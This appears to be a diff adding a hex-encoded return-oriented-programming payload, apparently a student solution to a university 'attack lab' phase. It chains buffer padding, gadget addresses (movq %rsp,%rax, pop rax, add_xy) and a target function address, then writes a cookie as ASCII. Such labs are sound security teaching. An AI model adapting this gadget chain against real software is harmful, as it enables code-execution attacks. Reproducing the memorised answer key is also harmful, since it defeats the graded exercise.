@@ -1,0 +1,16 @@
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 /* end buffer */
+4d 19 40 00 00 00 00 00 /* movl $0xc3e08948,(%rdi) movq %rsp, %rax Alt: eb 18 40 */
+af 18 40 00 00 00 00 00 /* movq %rax, %rdi Alt: a8 18 40 */
+b9 18 40 00 00 00 00 00 /* address for pop rax i.e. gadget 1 */
+00 00 00 00 00 00 00 00
+f8 18 40 00 00 00 00 00 /* eax to edx */
+38 19 40 00 00 00 00 00 /* edx to ecx Alt: a3 19 40 */
+13 19 40 00 00 00 00 00 /* ecx to esi Alt: 46 19 40 */
+cf 18 40 00 00 00 00 00 /* add_xy */
+af 18 40 00 00 00 00 00 /* movq %rax, %rdi Alt: a8 18 40 */
+0c 18 40 00 00 00 00 00 /* target_f3 w/ little endian */
+31 63 66 32 31 35 37 66 00 /* convert $0x1cf2157f to ascii hex rep */
